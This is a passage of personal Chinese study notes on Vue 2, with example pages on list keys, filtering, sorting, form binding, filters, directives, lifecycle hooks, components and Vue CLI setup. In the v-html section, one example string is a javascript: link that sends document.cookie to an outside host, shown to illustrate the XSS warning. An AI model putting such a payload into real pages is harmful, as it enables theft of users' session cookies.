> 											1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
> 											2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
> 												使用index作为key是没有问题的。
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<!-- 遍历数组 -->
> 			<h2>人员列表（遍历数组）</h2>
> 			<button @click.once="add">添加一个老刘</button>
> 			<ul>
> 				<li v-for="(p,index) of persons" :key="index">
> 					{{p.name}}-{{p.age}}
> 					<input type="text">
> 				</li>
> 			</ul>
> 		</div>
> 
> 		<script type="text/javascript">
> 			Vue.config.productionTip = false
> 			
> 			new Vue({
> 				el:'#root',
> 				data:{
> 					persons:[
> 						{id:'001',name:'张三',age:18},
> 						{id:'002',name:'李四',age:19},
> 						{id:'003',name:'王五',age:20}
> 					]
> 				},
> 				methods: {
> 					add(){
> 						const p = {id:'004',name:'老刘',age:40}
> 						this.persons.unshift(p)
> 					}
> 				},
> 			})
> 		</script>
> </html>
> ```
>
> 
>
> ![image-20220121104846037](Akio's Book.assets/image-20220121104846037.png)
>
> ![image-20220121105025936](Akio's Book.assets/image-20220121105025936.png)



```javascript
#region
#endregion
//折叠
```



##### 列表过滤

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表过滤</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<ul>
				<li v-for="(p,index) of filPerons" :key="index">
					{{p.name}}-{{p.age}}-{{p.sex}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			//用watch实现
			//#region 
			/* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[	//原数据
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]	//过滤后的数据
				},
				watch:{
					keyWord:{
						immediate:true,
						handler(val){	//一个参数时时newValue
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
			//#endregion
			
			//用computed实现
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						return this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
					}
				}
			}) 
		</script>
</html>
```

<img src="Akio's Book.assets/image-20220121111009483.png" alt="image-20220121111009483" style="zoom:67%;" /><img src="Akio's Book.assets/image-20220121111024460.png" alt="image-20220121111024460" style="zoom:67%;" />



##### 列表排序

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>列表排序</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" placeholder="请输入名字" v-model="keyWord">
			<button @click="sortType = 2">年龄升序</button>
			<button @click="sortType = 1">年龄降序</button>
			<button @click="sortType = 0">原顺序</button>
			<ul>
				<li v-for="(p,index) of filPerons" :key="p.id">
					{{p.name}}-{{p.age}}-{{p.sex}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					keyWord:'',
					sortType:0, //0原顺序 1降序 2升序
					persons:[
						{id:'001',name:'马冬梅',age:30,sex:'女'},
						{id:'002',name:'周冬雨',age:31,sex:'女'},
						{id:'003',name:'周杰伦',age:18,sex:'男'},
						{id:'004',name:'温兆伦',age:19,sex:'男'}
					]
				},
				computed:{
					filPerons(){
						const arr = this.persons.filter((p)=>{
							return p.name.indexOf(this.keyWord) !== -1
						})
						//判断一下是否需要排序
						if(this.sortType){
							arr.sort((p1,p2)=>{
								return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
							})
						}
						return arr
					}
				}
			}) 

		</script>
</html>
```

<img src="Akio's Book.assets/image-20220121111500152.png" alt="image-20220121111500152" style="zoom:50%;" />



##### VUE检测数据的原理

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=34&spm_id_from=pageDriver

略过p34-p37



#### 收集表单数据

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			收集表单数据：
					若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
					若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
					若：<input type="checkbox"/>
							1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
							2.配置input的value属性:
									(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
									(2)v-model的初始值是数组，那么收集的的就是value组成的数组
					备注：v-model的三个修饰符：
									lazy：失去焦点再收集数据
									number：输入字符串转为有效的数字
									trim：输入首尾空格过滤
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<form @submit.prevent="demo">
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))	//转换成json格式
				}
			}
		})
	</script>
</html>
```

<img src="Akio's Book.assets/image-20220121120145725.png" alt="image-20220121120145725" style="zoom:50%;" />



#### 过滤器

我们要实现一个时间格式的转换，时间戳->固定格式，我们就需要第三方插件,dayjs。还有一个更完善的叫moment.js

<img src="Akio's Book.assets/image-20220121130103035.png" alt="image-20220121130103035" style="zoom:67%;" />

https://www.bootcdn.cn/

![image-20220121130211674](Akio's Book.assets/image-20220121130211674.png)

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="../js/dayjs.min.js"></script>
	</head>
	<body>
		<!-- 
			过滤器：
				定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
				语法：
						1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
						2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
				备注：
						1.过滤器也可以接收额外参数、多个过滤器也可以串联
						2.并没有改变原本的数据, 是产生新的对应的数据
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 过滤器实现 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
			<h3 :x="msg | mySlice">尚硅谷</h3>
		</div>

		<div id="root2">
			<h2>{{msg | mySlice}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		//全局过滤器,必须在new Vue之前定义
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好，尚硅谷'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					// console.log('@',value)
					return dayjs(value).format(str)
				},
				// mySilce(value){	//上面全局的即是定义
				// 	return value.slice(0,4)
				// }
			}
		})

		new Vue({
			el:'#root2',
			data:{
				msg:'hello,atguigu!'
			}
		})
	</script>
</html>
```

<img src="Akio's Book.assets/image-20220121141747214.png" alt="image-20220121141747214" style="zoom:67%;" />



#### 内置指令

##### v-text

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>v-text指令</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 				我们学过的指令：
> 						v-bind	: 单向绑定解析表达式, 可简写为 :xxx
> 						v-model	: 双向数据绑定
> 						v-for  	: 遍历数组/对象/字符串
> 						v-on   	: 绑定事件监听, 可简写为@
> 						v-if 	 	: 条件渲染（动态控制节点是否存存在）
> 						v-else 	: 条件渲染（动态控制节点是否存存在）
> 						v-show 	: 条件渲染 (动态控制节点是否展示)
> 				v-text指令：
> 						1.作用：向其所在的节点中渲染文本内容。
> 						2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<div>你好，{{name}}</div>
> 			<div v-text="name"></div>
> 			<div v-text="str"></div>
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 		
> 		new Vue({
> 			el:'#root',
> 			data:{
> 				name:'尚硅谷',
> 				str:'<h3>你好啊！</h3>'
> 			}
> 		})
> 	</script>
> </html>
> ```

##### v-html

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>v-html指令</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 				v-html指令：
> 						1.作用：向指定节点中渲染包含html结构的内容。
> 						2.与插值语法的区别：
> 									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
> 									(2).v-html可以识别html结构。
> 						3.严重注意：v-html有安全性问题！！！！
> 									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
> 									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<div>你好，{{name}}</div>
> 			<div v-html="str"></div>
> 			<div v-html="str2"></div>
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 
> 		new Vue({
> 			el:'#root',
> 			data:{
> 				name:'尚硅谷',
> 				str:'<h3>你好啊！</h3>',
> 				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>获取cookie链接</a>',
> 				// 上面这个str2就会将当前网站所有的cookie当作参数传给http://www.baidu.com
> 			}
> 		})
> 	</script>
> </html>
> ```

##### v-cloak

> <img src="Akio's Book.assets/image-20220121143921203.png" alt="image-20220121143921203" style="zoom:67%;" />
>
> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>v-cloak指令</title>
> 		<style>
> 			[v-cloak]{
> 				display:none;
> 			}
> 		</style>
> 		<!-- 引入Vue -->
> 	</head>
> 	<body>
> 		<!-- 
> 				v-cloak指令（没有值）：
> 						1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
> 						2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<h2 v-cloak>{{name}}</h2>
> 		</div>
> 		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
> 	</body>
> 	
> 	<script type="text/javascript">
> 		console.log(1)
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 		
> 		new Vue({
> 			el:'#root',
> 			data:{
> 				name:'尚硅谷'
> 			}
> 		})
> 	</script>
> </html>
> ```

##### v-once

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>v-once指令</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 			v-once指令：
> 						1.v-once所在节点在初次动态渲染后，就视为静态内容了。
> 						2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<h2 v-once>初始化的n值是:{{n}}</h2>
> 			<h2>当前的n值是:{{n}}</h2>
> 			<button @click="n++">点我n+1</button>
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 		
> 		new Vue({
> 			el:'#root',
> 			data:{
> 				n:1
> 			}
> 		})
> 	</script>
> </html>
> ```

##### v-pre

> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>v-pre指令</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 			v-pre指令：
> 					1.跳过其所在节点的编译过程。
> 					2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<h2 v-pre>Vue其实很简单</h2>
> 			<h2 >当前的n值是:{{n}}</h2>
> 			<button @click="n++">点我n+1</button>
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 
> 		new Vue({
> 			el:'#root',
> 			data:{
> 				n:1
> 			}
> 		})
> 	</script>
> </html>
> ```
>
> <img src="Akio's Book.assets/image-20220121144905236.png" alt="image-20220121144905236" style="zoom:50%;" />



#### 自定义指令

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=45&spm_id_from=pageDriver

略过p45~p47



#### 生命周期

![image-20220121161452005](Akio's Book.assets/image-20220121161452005.png)

##### 引出声明周期

> mounted钩子函数:Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
>
> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>引出生命周期</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 				生命周期：
> 						1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
> 						2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
> 						3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
> 						4.生命周期函数中的this指向是vm 或 组件实例对象。
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<h2 v-if="a">你好啊</h2>
> 			<h2 :style="{opacity}">欢迎学习Vue</h2>	<!-- opacity透明度 -->
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 		
> 		 new Vue({
> 			el:'#root',
> 			data:{
> 				a:false,
> 				opacity:1
> 			},
> 			methods: {
> 				
> 			},
> 			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
> 			mounted(){
> 				console.log('mounted',this)
> 				setInterval(() => {
> 					this.opacity -= 0.01
> 					if(this.opacity <= 0) this.opacity = 1
> 				},16)
> 			},
> 		})
> 
> 		//通过外部的定时器实现（不推荐）
> 		/* setInterval(() => {
> 			vm.opacity -= 0.01
> 			if(vm.opacity <= 0) vm.opacity = 1
> 		},16) */
> 	</script>
> </html>
> ```

略过p48~p52



#### vue组件化编程

<img src="Akio's Book.assets/image-20220121161534789.png" alt="image-20220121161534789" style="zoom:47%;" />

<img src="Akio's Book.assets/image-20220121161927180.png" alt="image-20220121161927180" style="zoom:47%;" />

<img src="Akio's Book.assets/image-20220121162055342.png" alt="image-20220121162055342" style="zoom:50%;" />



##### 模块与组件、模块化与组件化

> **模块：**
>
> 1. 理解: 向外提供特定功能的 js 程序, 一般就是一个 js 文件 
> 2. 为什么: js 文件很多很复杂
> 3. 作用: 复用 js, 简化 js 的编写, 提高 js 运行效
>
> **组件：**
>
> ​	1.理解: 用来实现局部(特定)功能效果的代码集合(html/css/js/image…..
>
> ​	2.为什么: 一个界面的功能很复杂
>
> ​	3.作用: 复用编码, 简化项目编码, 提高运行效率

> 模块化：当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用。
>
> 组件化：当应用中的功能都是多组件的方式来编写的, 那这个应用就是一个组件化的应用

##### 非单文件组件

![image-20220121170226219](Akio's Book.assets/image-20220121170226219.png)

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本使用</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			Vue中使用组件的三大步骤：
					一、定义组件(创建组件)
					二、注册组件
					三、使用组件(写组件标签)

			一、如何定义一个组件？
						使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
						区别如下：
								1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
								2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
						备注：使用template可以配置组件结构。

			二、如何注册组件？
							1.局部注册：靠new Vue的时候传入components选项
							2.全局注册：靠Vue.component('组件名',组件)

			三、编写组件标签：
							<school></school>
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<hello></hello>
			<hr>
			<h1>{{msg}}</h1>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<school></school>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<student></student>
		</div>

		<div id="root2">
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		//第一步：创建school组件
		const school = Vue.extend({
			template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
				</div>
			`,
			// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
			data(){
				return {
					schoolName:'尚硅谷',
					address:'北京昌平'
				}
			},
			methods: {
				showName(){
					alert(this.schoolName)
				}
			},
		})

		//第一步：创建student组件
		const student = Vue.extend({
			template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
			data(){
				return {
					studentName:'张三',
					age:18
				}
			}
		})
		
		//第一步：创建hello组件
		const hello = Vue.extend({
			template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
				</div>
			`,
			data(){
				return {
					name:'Tom'
				}
			}
		})
		
		//第二步：全局注册组件
		Vue.component('hello',hello)

		//创建vm
		new Vue({
			el:'#root',
			data:{
				msg:'你好啊！'
			},
			//第二步：注册组件（局部注册）
			components:{
				school,//也可以叫别名univity:school,使用的时候<univity></univity>
				student
			}
		})

		new Vue({
			el:'#root2',
		})
	</script>
</html>
```

注意

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>几个注意点</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			几个注意点：
					1.关于组件名:
								一个单词组成：
											第一种写法(首字母小写)：school
											第二种写法(首字母大写)：School
								多个单词组成：
											第一种写法(kebab-case命名)：my-school
											第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
								备注：
										(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
										(2).可以使用name配置项指定组件在开发者工具中呈现的名字。

					2.关于组件标签:
								第一种写法：<school></school>
								第二种写法：<school/>
								备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

					3.一个简写方式：
								const school = Vue.extend(options) 可简写为：const school = options
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>{{msg}}</h1>
			<school></school>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		//定义组件
		const s = Vue.extend({
			name:'atguigu',	//vue开发者工具中呈现的名字
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			}
		})

		new Vue({
			el:'#root',
			data:{
				msg:'欢迎学习Vue!'
			},
			components:{
				school:s
			}
		})
	</script>
</html>
```

###### 组件的嵌套

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>组件的嵌套</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- <app></app>这里写了，new Vue()中的template就不要 -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//定义student组件
		const student = Vue.extend({
			name:'student',
			template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					age:18
				}
			}
		})
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			//注册组件（局部）
			components:{
				student
			}
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`<h1>{{msg}}</h1>`,
			data(){
				return {
					msg:'欢迎来到尚硅谷学习！'
				}
			}
		})
		
		//定义app组件
		const app = Vue.extend({
			template:`
				<div>	
					<hello></hello>
					<school></school>
				</div>
			`,
			components:{
				school,
				hello
			}
		})

		//创建vm
		new Vue({
			template:'<app></app>',
			el:'#root',
			//注册组件（局部）
			components:{app}
		})
	</script>
</html>
```



###### VueComponent

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=57&spm_id_from=pageDriver

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>VueComponent</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			关于VueComponent：
						1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

						2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
							即Vue帮我们执行的：new VueComponent(options)。

						3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

						4.关于this指向：
								(1).组件配置中：
											data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
								(2).new Vue(options)配置中：
											data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

						5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
							Vue的实例对象，以后简称vm。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<school></school>
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showName">点我提示学校名</button>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			methods: {
				showName(){
					console.log('showName',this)
				}
			},
		})

		const test = Vue.extend({
			template:`<span>atguigu</span>`
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`
				<div>
					<h2>{{msg}}</h2>
					<test></test>	
				</div>
			`,
			data(){
				return {
					msg:'你好啊！'
				}
			},
			components:{test}
		})


		// console.log('@',school)
		// console.log('#',hello)

		//创建vm
		const vm = new Vue({
			el:'#root',
			components:{school,hello}
		})
	</script>
</html>
```



###### 一个重要内置关系

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=59&spm_id_from=pageDriver



##### 单文件组件

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=60&spm_id_from=pageDriver

视频中会介绍三种暴露方式

<img src="Akio's Book.assets/image-20220121214737999.png" alt="image-20220121214737999" style="zoom:80%;" />

School.vue

```html
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {	//默认暴露
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

Student.vue

```html
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>
```

App.vue 用于汇总所有的组件

```html
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{	//注册
			School,
			Student
		}
	}
</script>
```

main.js	import语法需要在vue脚手架中才能使用，如果前面组件用的是统一暴露，写import {}

```javascript
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

index.html

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
		<!-- <script type="text/javascript" src="../js/vue.js"></script> -->
		<!-- <script type="text/javascript" src="./main.js"></script> -->
	</body>
</html>
```





### 使用vue脚手架

#### 1.安装脚手架

> Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）。最新的版本是 4.x。 文档: https://cli.vuejs.org/zh/
>
> 推荐安装4.x的版本，会向下兼容
>
> **安装脚手架步骤**
>
> 1、全局安装@vue/cli
>
> `npm install -g @vue/cli`
>
> 2、**切换到你要创建项目的目录**，然后使用命令创建项目，然后会弹出选择vue版本
>
> `vue create 项目名`
>
> <img src="Akio's Book.assets/image-20220121220628623.png" alt="image-20220121220628623" style="zoom:50%;" />
>
> 3、在目录下使用`npm run serve`可运行
>
> 备注:
>
> - 如出现下载缓慢请配置 npm 淘宝镜像：`npm config set registry https://registry.npm.taobao.org`
>
> - Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置， 请执行：`vue inspect > output.js`



#### 2、介绍初始项目结构

![image-20220121220947345](Akio's Book.assets/image-20220121220947345.png)

> ```html
> ├── node_modules
> ├── public
> │ ├── favicon.ico: 页签图标
> │ └── index.html: 整个项目的主页面
> ├── src
> │ ├── assets: 存放静态资源
> │ │ └── logo.png
> │ │── component: 存放组件
> │ │ └── HelloWorld.vue
> │ │── App.vue: 汇总所有组件
> │ │── main.js: 入口文件,当运行npm run serve的时候首先就去运行这个文件
> ├── .gitignore: git 版本管制忽略的配置
> ├── babel.config.js: babel 
> ├── package.json: 应用包配置文件
> ├── README.md: 应用描述文件
> ├── package-lock.json：包版本控制文件
> ```
>
> main.js
>
> ```java
> /*
> 	该文件是整个项目的入口文件
> */
> //引入Vue
> import Vue from 'vue'
> //引入App，它是所有组件的夫组件
> import App from './App.vue'
> //关闭Vue的生产提示
> Vue.config.productionTip = false
> //创建Vue实例对象------vm
> new Vue({
> 	// el:'#app',	//相当于下面的.$mount('#app')
> 	render: h => h(App),
> }).$mount('#app')
> ```
>
> public/index.html
>
> ```html
> <!DOCTYPE html>
> <html lang="">
>   <head>
>     <meta charset="utf-8">
> 		<!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 -->
>     <meta http-equiv="X-UA-Compatible" content="IE=edge">
> 		<!-- 开启移动端的理想视口 -->
>     <meta name="viewport" content="width=device-width,initial-scale=1.0">
> 		<!-- 配置页签图标 <%= BASE_URL %> 表示public文件夹下的路径 -->
>     <link rel="icon" href="<%= BASE_URL %>favicon.ico">
> 		<!-- 引入第三方样式 -->
> 		<link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
> 		<!-- 配置网页标题 -->
>     <title>硅谷系统</title>
>   </head>
>   <body>
> 		<!-- 当浏览器不支持js时noscript中的元素就会被渲染 -->
>     <noscript>
>       <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
>     </noscript>
> 		<!-- 容器 -->
>     <div id="app"></div>
>     <!-- built files will be auto injected -->
>   </body>
> </html>
> ```
>



#### 3、render函数

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=63&spm_id_from=pageDriver

